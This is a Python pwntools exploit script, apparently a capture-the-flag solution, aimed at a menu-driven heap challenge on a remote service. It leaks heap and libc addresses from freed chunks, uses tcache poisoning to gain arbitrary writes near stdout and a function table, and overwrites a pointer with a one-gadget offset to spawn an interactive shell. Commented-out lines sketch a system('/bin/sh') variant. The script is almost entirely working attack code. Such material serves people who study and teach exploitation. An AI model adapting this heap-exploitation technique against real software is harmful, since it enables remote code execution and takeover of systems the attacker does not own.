#!/usr/bin/python3
#-*- coding: utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.arch='amd64'
context.terminal = ['tmux','sp','-h','-l','120']

# remote_service = ""
# remote_service = remote_service.strip().split(":")
# p = remote(remote_service[0], int(remote_service[1]))
p = remote("192.168.166.190", 58013)
filename = "./test"
# p = process(filename)
e = ELF(filename, checksec=False)
l = ELF(e.libc.path, checksec=False)

rl = lambda a=False : p.recvline(a)
ru = lambda a,b=True : p.recvuntil(a,b)
rn = lambda x : p.recvn(x)
sn = lambda x : p.send(x)
sl = lambda x : p.sendline(x)
sa = lambda a,b : p.sendafter(a,b)
sla = lambda a,b : p.sendlineafter(a,b)
irt = lambda : p.interactive()
dbg = lambda text=None : gdb.attach(p, text)
lg = lambda s : log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
i2b = lambda c : str(c).encode()
uu32 = lambda data : u32(data.ljust(4, b'\x00'))
uu64 = lambda data : u64(data.ljust(8, b'\x00'))
def debugPID():
	# lg("p.pid")
	# input()
	pass

def cmd(choice):
	ru(b'Choice: ')
	sl(i2b(choice))

def add():
	cmd(1)

def delete(idx):
	cmd(2)
	ru(b'Idx: \n')
	sl(i2b(idx))

def show(idx):
	cmd(3)
	ru(b'Idx: \n')
	sl(i2b(idx))

def edit(idx, content, size=0):
	if (size==0):
		size = len(content)
	cmd(4)
	ru(b'Idx: \n')
	sl(i2b(idx))
	ru(b'Size: \n')
	sl(i2b(size))
	ru(b'Content: \n')
	sn(content)

for i in range(9):		# 8
	add()

for i in range(8):
	delete(i)			# 7

# add()
# delete(0)
show(0)
heap_xor = uu64(ru(b"\nDone", "drop"))
heap_base = heap_xor << 12
lg("heap_base")

# debugPID()

show(7)
libc_base = uu64(ru(b"\nDone", "drop")) - 0x1f2cc0
lg("libc_base")


# debugPID()
table_addr = libc_base + 0x1f4560
stdout_addr = libc_base + 0x1f3760
target = (heap_base + 0x100)^heap_xor
edit(6, p64(target))
add()
add()

target = stdout_addr
edit(10, p64(0) + p64(target))
# edit(10, p64(0)*3 + p64(libc_base + l.symbols['system']))
add()


target = table_addr
edit(10, p64(0) + p64(target))
add()
# edit(11, b'/bin/sh\x00')
# cmd(4)
# sl(i2b(12))
# payload = p64(0)*3 + p64(libc_base + l.symbols['system'])
# sl(i2b(len(payload)))
# sn(payload)

edit(12, p64(0)*3 + p64(libc_base + 0xda864))

debugPID()
irt()
